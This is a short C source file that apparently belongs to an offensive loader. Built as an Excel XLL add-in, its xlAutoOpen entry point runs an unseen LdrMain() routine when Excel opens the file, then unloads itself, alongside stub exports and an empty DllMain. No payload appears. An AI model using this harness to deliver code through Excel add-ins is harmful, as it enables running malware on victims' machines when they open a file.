#include <Ldr.h>
#include <Config.h>
#include <common/phnt.h>
#include <common/Macros.h>
#include <core/Win32.h>
#include <common/Defines.h>

#include <common/Debug.h>

#if defined( XLL ) && ( XLL == TRUE )

DLLEXPORT INT 
WINAPI xlAutoOpen( 
    VOID
) {

    LdrMain();

    return 0; // causes EXCEL to unload XLL
}

DLLEXPORT INT WINAPI xlAutoClose( VOID ) { return 1; }
DLLEXPORT INT WINAPI xlAutoAdd( VOID ) { return 1; }
DLLEXPORT INT WINAPI xlAutoRemove( VOID ) { return 1; }
DLLEXPORT PVOID WINAPI xlAddInManagerInfo( VOID ) { return NULL; }
DLLEXPORT PVOID WINAPI xlAutoRegister( VOID ) { return NULL; }


#pragma comment( linker, "/ENTRY:DllMain" )
BOOL APIENTRY 
DllMain( 
    IN     HINSTANCE DllBase, 
    IN     DWORD     dwReason, 
    IN OUT LPVOID    lpReserved 
) {
    switch ( dwReason ) {

    case DLL_PROCESS_ATTACH: {
        break;
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH: {
        break;
    }

    }

    return TRUE;
}

#endif // XLL == TRUE